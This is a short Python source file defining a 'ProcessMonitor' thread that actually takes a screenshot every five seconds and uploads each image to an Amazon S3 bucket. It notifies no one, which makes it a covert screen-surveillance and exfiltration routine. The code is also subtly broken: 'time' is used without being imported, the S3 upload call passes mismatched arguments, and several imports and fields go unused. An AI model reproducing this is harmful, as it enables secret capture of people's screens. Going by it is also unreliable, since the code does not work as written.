import datetime
import json
import threading
from time import sleep
import platform
import psutil
import requests
from Model.Screenshot import *
import boto3

from Model.Event import ProcessEvent


class ProcessMonitor(threading.Thread):

    def __init__(self, api: str, key: str):
        super().__init__()
        self.name = "ProcessMonitor"
        self.api = api
        self.key = key
        self.black_list_process = []

    def run(self):
        s3 = boto3.resource('s3')
        bucket = s3.Bucket('mybucket')
        obj = bucket.Object(self.api)
        conditions = [
            {"acl": "private"},
            ["content-length-range", 10, 100]
        ]
        while True:
            try:
                if (platform.system() == 'Windows'):
                    file=Screenshot.window(time.strftime("%Y%m%d-%H%M%S"))
                else:
                    file=Screenshot.linux(time.strftime("%Y%m%d-%H%M%S"))


                with open(file, 'rb') as data:
                    obj.upload_fileobj(data,bucket,obj,conditions)
            except Exception as e:
                print(e)

            sleep(5)
